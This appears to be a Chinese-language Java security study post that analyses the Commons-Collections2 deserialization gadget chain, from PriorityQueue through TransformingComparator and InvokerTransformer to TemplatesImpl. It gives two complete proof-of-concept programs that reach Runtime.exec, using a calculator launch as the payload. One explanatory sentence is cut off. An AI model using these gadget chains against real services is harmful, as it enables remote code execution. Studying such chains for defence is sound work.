# 环境搭建
> 1. `JDK`版本：JDK1.8u66
> 2. `Commons-Collections4`版本：4.0
> 3. `javassit`版本：`3.25.0-GA`

> 利用`maven`来进行搭建，先创建一个`Maven`项目，不用选择任何`Maven`模板，`pom.xml`中内容如下，之后选择右侧的更新，让其自动导入包即可

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>commons-collections</artifactId>
    <version>1.0-SNAPSHOT</version>

    <dependencies>
        <dependency>
            <groupId>org.apache.commons</groupId>
            <artifactId>commons-collections4</artifactId>
            <version>4.0</version>
        </dependency>
        <dependency>
            <groupId>org.javassist</groupId>
            <artifactId>javassist</artifactId>
            <version>3.25.0-GA</version>
        </dependency>
    </dependencies>

</project>
```

# 前置知识
## PriorityQueue
> `PriorityQueue`优先级队列是基于优先级堆的一种特殊队列，它给每个元素定义“优先级”，这样取出数据的时候会按照优先级来取，默认情况下，优先级队列会根据自然顺序对元素进行排序；因此放入`PriorityQueue`的元素必须实现`Comparable`接口，`PriorityQueue`会根据元素的排序顺序决定出队的优先级，如果没有实现`Comparable`接口，`PriorityQueue`还允许提供一个`Comparator`对象来判断两个元素的顺序，`PriorityQueue`支持反序列化，在重写的`readObject`方法中将数据反序列化到`queue`中之后，会调用`heapify()`方法来对数据进行排序

<img src="./Java安全学习-Commons-Collections2链/1.png" alt="">

> 在`heapify()`方法中又会调用`siftDown()`方法，在`comparator != null`下会调用`siftDownUsingComparator()`方法，在`siftDownUsingComparator()`方法中会调用`comparator`的`compare()`方法来进行优先级的比较和排序

<img src="./Java安全学习-Commons-Collections2链/2.png" alt="">

## TransformingComparator
> `TransformingComparator`类似`TransformedMap`，用`Tranformer`来装饰一个`Comparator`，待比较的值将先使用`Tranformer`转换，再传递给`Comparator`比较，`TransformingComparator`初始化时配置`Transformer`和`Comparator`，如果不指定`Comparator`则使用`ComparableComparator.<Comparable>comparableComparator()`
> 在调用`TransformingComparator`的`compare`方法时，调用了`this.transformer.transform()`方法对要比较的两个值进行转换，然后再调用`compare`方法比较

<img src="./Java安全学习-Commons-Collections2链/3.png" alt="">

> 在`PriorrityQueue`中最后会通过`comparator`的`compare()`方法来进行优先级的比较和排序，这里可以通过调用`TransformingComparator`中的`transform()`方法来和之前连接起来

## Javassist
> `Java`字节码以二进制的形式存储在`.class`文件中，每一个`.class`文件包含一个`Java`类或接口，`Javaassist`就是一个用来处理`Java`字节码的类库，它可以在一个已经编译好的类中添加新的方法，或者是修改已有的方法，并且不需要对字节码方面有深入的了解，同时也可以去生成一个新的类对象，通过完全手动的方式

## TemplatesImpl
> `TemplatesImpl`的属性`_bytecodes`存储了类字节码，`TemplatesImpl`类的部分方法可以使用这个类字节码去实例化这个类，这个类的父类需是`AbstractTranslet`，在这个类的无参构造方法或静态代码块中写入恶意代码，再借`TemplatesImpl`之手实例化这个类触发恶意代码

# Commons-Collections2 分析
> 先跟进`PriorityQueue#readObject`，其`queue`的值来自于`readObject()`方法，是可控的，循环完成后会调用`heapify()`方法

```java
private void readObject(java.io.ObjectInputStream s)
    throws java.io.IOException, ClassNotFoundException {
    // Read in size, and any hidden stuff
    s.defaultReadObject();

    // Read in (and discard) array length
    s.readInt();

    queue = new Object[size];

    // Read in all elements.
    for (int i = 0; i < size; i++)
        queue[i] = s.readObject();

    // Elements are guaranteed to be in "proper order", but the
    // spec has never explained what that might be.
    heapify();
}
```
> 在`heapify()`方法中，继续会调用`siftDown()`方法，这里的`x`是可控的，让`comparator`不为空进而调用`siftDownUsingComparator()`方法，在`siftDownUsingComparator()`方法中会调用前面`comparator`的`compare`方法

```java
private void heapify() {
    for (int i = (size >>> 1) - 1; i >= 0; i--)
        siftDown(i, (E) queue[i]);
}

private void siftDown(int k, E x) {
    if (comparator != null)
        siftDownUsingComparator(k, x);
    else
        siftDownComparable(k, x);
}

private void siftDownUsingComparator(int k, E x) {
    int half = size >>> 1;
    while (k < half) {
        int child = (k << 1) + 1;
        Object c = queue[child];
        int right = child + 1;
        if (right < size &&
            comparator.compare((E) c, (E) queue[right]) > 0)
            c = queue[child = right];
        if (comparator.compare(x, (E) c) <= 0)
            break;
        queue[k] = c;
        k = child;
    }
    queue[k] = x;
}
```
> 这里将`comparator`和`TransformingComparator`结合起来，如果这里`this.transformer`是可控的话，就可以进一步利用`CC-1`链的后半段部分

```java
public int compare(I obj1, I obj2) {
    O value1 = this.transformer.transform(obj1);
    O value2 = this.transformer.transform(obj2);
    return this.decorated.compare(value1, value2);
}
```
> 这里需要注意几个地方，在`heapify()`方法处的`size`要是大于`1`的，只有这样才会继续进入到`siftDown()`方法中，而`size`的取值来自于

## POC-1
> 利用`PriorityQueue`和`CommonsCollections-1`后半部分来进行构造

```java
package CommonsCollections2;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/11/26 9:42 下午
 */
public class CommonsCollectionsGadget1 {
    // public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
    public static void CC2() throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a /System/Applications/Calculator.app"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
        PriorityQueue priorityQueue = new PriorityQueue(2);
        priorityQueue.add(1);
        priorityQueue.add(2);
        Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
        field.setAccessible(true);
        field.set(priorityQueue, transformingComparator);
        try {
            // 序列化操作
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./CC2EvilGadget.bin"));
            outputStream.writeObject(priorityQueue);
            outputStream.close();
            // 反序列化操作
            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./CC2EvilGadget.bin"));
            inputStream.readObject();
            inputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        try {
            CC2();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

<img src="./Java安全学习-Commons-Collections2链/4.png" alt="">

## POC-2
> 为了更好的符合实战利用中的要求，利用`InvokerTransformer`触发`TemplatesImpl`的`newTransformer`，从而读取恶意字节码从而进行执行命令，并且利用`javassist`和`TemplatesImpl`来进行构造

```java
package CommonsCollections2;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.*;
import java.io.*;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/11/29 1:37 上午
 */
public class CommonsCollectionsGadget2 {
    public static void CC2() throws NoSuchMethodException, IllegalAccessException, NoSuchFieldException, ClassNotFoundException, NotFoundException, CannotCompileException, IOException{
        Class c1 = Class.forName("org.apache.commons.collections4.functors.InvokerTransformer");
        Constructor constructor = c1.getDeclaredConstructor(String.class);
        constructor.setAccessible(true);
        Transformer transformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});

        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass ctClass = classPool.makeClass("CommonsCollectionsEvilCode");
        ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));
        String shell = "java.lang.Runtime.getRuntime().exec(\"open -a /System/Applications/Calculator.app\");";
        ctClass.makeClassInitializer().insertBefore(shell);
        ctClass.writeFile("./");

        byte[] ctClassBytes = ctClass.toBytecode();
        byte[][] targetByteCodes = new byte[][]{ctClassBytes};

        TemplatesImpl templates = new TemplatesImpl();
        Class clazz = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        Field _name = clazz.getDeclaredField("_name");
        Field _bytecode = clazz.getDeclaredField("_bytecodes");
        Field _tfactory = clazz.getDeclaredField("_tfactory");
        _name.setAccessible(true);
        _bytecode.setAccessible(true);
        _tfactory.setAccessible(true);
        _name.set(templates, "h3rmesk1t");
        _bytecode.set(templates, targetByteCodes);
        _tfactory.set(templates, new TransformerFactoryImpl());

        TransformingComparator transformingComparator = new TransformingComparator(transformer);
        PriorityQueue priorityQueue = new PriorityQueue(2);
        priorityQueue.add(1);
        priorityQueue.add(2);
        Class c2 = Class.forName("java.util.PriorityQueue");
        Field _queue = c2.getDeclaredField("queue");
        _queue.setAccessible(true);
        Object[] queue_array = new Object[]{templates,1};
        _queue.set(priorityQueue,queue_array);

        Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
        field.setAccessible(true);
        field.set(priorityQueue, transformingComparator);
        try {
            // 序列化操作
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./CC2EvilGadget2.bin"));
            outputStream.writeObject(priorityQueue);
            outputStream.close();
            // 反序列化操作
            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./CC2EvilGadget2.bin"));
            inputStream.readObject();
            inputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        try {
            CC2();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

<img src="./Java安全学习-Commons-Collections2链/5.png" alt="">

# 调用链
```java
ObjectInputStream.readObject()
    PriorityQueue.readObject()
        PriorityQueue.heapify()
            PriorityQueue.siftDown()
                PriorityQueue.siftDownUsingComparator()
                    TransformingComparator.compare()
                        InvokerTransformer.transform()
                                Method.invoke()
                                    TemplatesImpl.newTransformer()
                                         TemplatesImpl.getTransletInstance()
                                         TemplatesImpl.defineTransletClasses
                                         newInstance()
                                            Runtime.exec()
```

# 总结
> 利用`PriorityQueue`在反序列化后会对队列进行优先级排序的特点，为其指定`TransformingComparator`排序方法，并在其中为其添加`Transforer`，与`CommonsCollections1`链类似，主要的触发位置还是`InvokerTransformer`